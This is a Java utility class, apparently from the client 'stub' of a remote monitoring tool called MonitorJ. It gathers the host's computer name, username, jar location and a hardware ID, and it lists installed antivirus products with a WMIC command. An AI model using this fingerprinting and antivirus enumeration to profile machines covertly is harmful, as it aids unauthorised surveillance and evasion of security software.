package me.jershdervis.monitorj.stub.util;

import me.jershdervis.monitorj.stub.MonitorJStub;

import java.io.*;
import java.net.InetAddress;
import java.net.URISyntaxException;
import java.net.UnknownHostException;

/**
 * Created by Josh on 18/06/2015.
 * This class is designed to provide information on the client's system.
 */
public class ClientSystemUtil {

    public static String getJavaBinDir() {
        return System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
    }

    public static File getCurrentRunningJar() throws URISyntaxException {
        return new File(MonitorJStub.class.getProtectionDomain().getCodeSource().getLocation().toURI());
    }

    public static String getComputerName() throws UnknownHostException {
        return InetAddress.getLocalHost().getHostName();
    }

    public static String getUsername() {
        return System.getProperty("user.name");
    }

    public static String getAntiVirus() throws IOException {
        Process process = Runtime.getRuntime().exec("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List");
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

        String result = "None";
        String line;
        while ((line = reader.readLine()) != null) {
            if ((line.length() >= 1) && (line.trim().contains("displayName"))) {
                result = line.split("=")[1];
                break;
            }
        }
        return result;
    }

    private static String stringToHex(String base) {
        StringBuffer buffer = new StringBuffer();
        int intValue;
        for(int x = 0; x < base.length(); x++) {
            int cursor = 0;
            intValue = base.charAt(x);
            String binaryChar = new String(Integer.toBinaryString(base.charAt(x)));
            for(int i = 0; i < binaryChar.length(); i++) {
                if(binaryChar.charAt(i) == '1')
                    cursor += 1;
            }
            if((cursor % 2) > 0)
                intValue += 128;
            buffer.append(Integer.toHexString(intValue) + "");
        }
        return buffer.toString();
    }

    public static String getHWID() {
        return stringToHex(System.getProperty("user.name") + System.getProperty("os.version") + System.getProperty("os.name") + System.getProperty("os.arch"));
    }

    public static String jarLocationOnDisc() throws URISyntaxException {
        return new File(MonitorJStub.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getAbsolutePath();
    }
}
